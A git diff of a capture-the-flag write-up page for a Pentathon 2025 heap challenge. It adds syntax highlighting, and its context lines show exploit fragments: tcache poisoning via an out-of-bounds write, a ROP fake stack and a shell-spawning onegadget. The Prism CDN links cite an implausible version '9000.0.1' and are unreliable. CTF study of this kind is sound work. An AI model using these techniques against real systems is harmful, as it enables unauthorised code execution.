@@ -11,6 +11,7 @@ permalink: /writeups/Pentathon2025/
 
 <!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />
 
 <section id="back" class="back">
@@ -101,7 +102,7 @@ NCIIPC-AICTE Pentathon 2025</code></h1>
         <div class="section-content">
             <h3>Pointer Mangling Utilities</h3>
             <p>Thanks to <code>rop.la</code>, Used the following functions from the  author's post:</p>
-            <pre><code>rol = lambda val, r_bits, max_bits: \
+            <pre><code class="language-python">rol = lambda val, r_bits, max_bits: \
     (val << r_bits%max_bits) & (2**max_bits-1) | \
     ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
@@ -117,7 +118,7 @@ def encrypt(v, key):
             <div class="h4-wrapper">
                 <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>#!/bin/python3
+    </div><pre><code class="language-python">#!/bin/python3
 
 from pwn import *
 memory  = 0x404030
@@ -240,7 +241,7 @@ if __name__ == "__main__":
                 Things I was specifically looking for:
                 <ul>
                     <li>Use After Free ? Nope. The author was nice enough to NULL out the pointer after freeing:</li>
-                    <pre><code>*((_QWORD *)&notes + 2 * (int)v1) = 0LL;</code></pre>
+                    <pre><code class="language-c">*((_QWORD *)&notes + 2 * (int)v1) = 0LL;</code></pre>
                     <li>Double free? Nah.</li>
                     <li>OOB (Out Of Bounds)? Yes, Jackpot.</li>
                 </ul>
@@ -257,7 +258,7 @@ if __name__ == "__main__":
                     <li>A smaller chunk sitting inside it (the <code>Victim</code>)</li>
                 </ul>
                 By leveraging the <code>OOB write</code> from the large chunk, I nuked the metadata of the larger one using <code>test</code> chunk and teed up a tcache poisoning attack.<br>
-                <pre><code>test3_chunk = create(15,"test")
+                <pre><code class="language-python">test3_chunk = create(15,"test")
 overlapper4_chunk = create(15,"Overlapper")
 victim5_chunk = create(15,"Victim")
 write(2, 24, 0xf1) #the 2 points to the index of chunk "test"</code></pre>
@@ -315,8 +316,7 @@ write(2, 24, 0xf1) #the 2 points to the index of chunk "test"</code></pre>
                     <li><code>onegadget</code> for that nice little <code>execve()</code> shell</li>
                 </ul>
                 All written using our <code>write_note()</code> primitive. Here's what the fake stack looked like:<br><br>
-
-                <pre><code>stack_pivot = fake_widedata_entry + 168 + 8
+                <pre><code class="language-python">stack_pivot = fake_widedata_entry + 168 + 8
 pop_rsi = libc + 0x0000000000030081
 pop_rdx_r12 = libc + 0x00000000001221f1
 shell = b"/bin/zsh"
@@ -337,7 +337,7 @@ fake_stack += p64(onegadget)
 fake_stack += b"\x00"*8
 fake_stack += p64(fake_widedata_entry)</code></pre>
                 Finally, to pop the shell, we just needed to trigger:<br>
-                <pre><code>write(index=15)  # index > 10 triggers fwrite(stderr)</code></pre>
+                <pre><code class="language-python">write(index=15)  # index > 10 triggers fwrite(stderr)</code></pre>
                 And…
             </p>
         </div>
@@ -345,7 +345,7 @@ fake_stack += p64(fake_widedata_entry)</code></pre>
             <h4>BOOM! Shell popped.</h4>
             <p>
                 <b>Here is my nice little banner.</b>
-<pre><code>[*] System pwned
+<pre><code class="language-python">[*] System pwned
 [*] Shell spawned
 [*] Get the flag!
 
@@ -359,7 +359,7 @@ $
     <div class="h4-wrapper">
         <h4>Complete Exploit:</h4>
              <button class="copy-btn">Copy</button>
-    </div><pre><code>#!/bin/python3
+    </div><pre><code class="language-python">#!/bin/python3
 
 from pwn import *
 import warnings
@@ -517,5 +517,7 @@ io.interactive()
 </section>
 </section>
 
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script src="{{ '/writeups/copy.js' | relative_url }}"></script>
